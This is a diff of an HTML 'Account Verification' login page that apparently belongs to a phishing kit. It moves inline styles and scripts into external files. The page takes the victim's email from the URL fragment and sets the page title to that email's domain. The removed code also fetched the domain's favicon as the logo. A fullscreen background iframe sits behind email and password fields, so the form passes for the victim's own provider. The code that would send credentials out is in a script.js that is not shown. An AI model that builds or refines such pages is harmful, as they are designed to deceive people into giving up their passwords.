@@ -4,174 +4,56 @@
   <meta charset="UTF-8" />
   <title>Account Verification</title>
 
-  <!-- Font Awesome for icons -->
+  <!-- ✅ Font Awesome for icons -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
-  <style>
-    /* Fullscreen background iframe */
-    #bg-frame {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      border: none;
-      z-index: -1;
-    }
+  <!-- ✅ Your custom CSS -->
+  <link rel="stylesheet" href="style.css">
 
-    /* Overlay for login */
-    .overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.75);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .login-box {
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      width: 320px;
-      text-align: center;
-      position: relative;
-    }
-
-    .login-box img#logo {
-      width: 80px;
-      margin-bottom: 20px;
-    }
-
-    .input-group {
-      margin-bottom: 15px;
-      position: relative;
-    }
-
-    .input-group .icon {
-      position: absolute;
-      top: 50%;
-      left: 10px;
-      transform: translateY(-50%);
-      color: #555;
-    }
-
-    .input-group input {
-      width: 100%;
-      padding: 10px 10px 10px 35px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-
-    .error-msg {
-      color: red;
-      margin-bottom: 10px;
-      height: 18px;
-    }
-
-    button#login-btn {
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      background: #007bff;
-      color: white;
-      cursor: pointer;
-    }
-
-    /* Loading overlay */
-    .loading-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.7);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      color: white;
-      font-size: 18px;
-      z-index: 9999;
-      display: none; /* hidden by default */
-    }
-
-    .loading-overlay img {
-      width: 100px;
-      animation: spin 1.5s linear infinite;
-      margin-bottom: 15px;
-      border-radius: 10%;
-    }
-
-    @keyframes spin {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
-    }
-  </style>
-
+  <!-- ✅ Dynamic Title Script with Capitalized First Letter -->
   <script>
     window.addEventListener("DOMContentLoaded", function () {
-      const hash = window.location.hash.substring(1); // Remove '#'
+      const hash = window.location.hash.substring(1); // Remove the '#' character
       const parts = hash.split("@");
-      let domain = '';
       if (parts.length === 2) {
-        domain = parts[1];
+        const domain = parts[1];
         const capitalized = domain.charAt(0).toUpperCase() + domain.slice(1);
         document.title = capitalized;
-
-        // Set logo
-        const logoImg = document.getElementById('logo');
-        logoImg.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
       }
-
-      const loginBtn = document.getElementById('login-btn');
-      const loading = document.getElementById('loading');
-
-      loginBtn.addEventListener('click', function () {
-        // Show loading overlay
-        loading.style.display = 'flex';
-
-        // Simulate login delay
-        setTimeout(() => {
-          loading.style.display = 'none';
-          alert('Login simulated!');
-        }, 3000);
-      });
     });
   </script>
 </head>
 <body>
 
+  <!-- Fullscreen background iframe -->
   <iframe id="bg-frame"></iframe>
 
+  <!-- Login overlay -->
   <div class="overlay" id="overlay">
     <div class="login-box">
       <img id="logo" alt="Logo" />
 
+      <!-- ✅ Email input with icon -->
       <div class="input-group">
         <i class="fas fa-envelope icon"></i>
         <input type="email" id="email" placeholder="Email" />
       </div>
 
+      <!-- ✅ Password input with icon -->
       <div class="input-group">
         <i class="fas fa-lock icon"></i>
         <input type="password" id="password" placeholder="Password" />
       </div>
 
+      <!-- Error message -->
       <div id="error-msg" class="error-msg"></div>
 
+      <!-- Login button -->
       <button id="login-btn">Login</button>
     </div>
   </div>
 
-  <!-- Loading overlay -->
-  <div class="loading-overlay" id="loading">
-    <img id="loading-logo" alt="Loading" />
-    Loading...
-  </div>
-
+  <!-- ✅ Your JavaScript -->
+  <script src="script.js"></script>
 </body>
 </html>
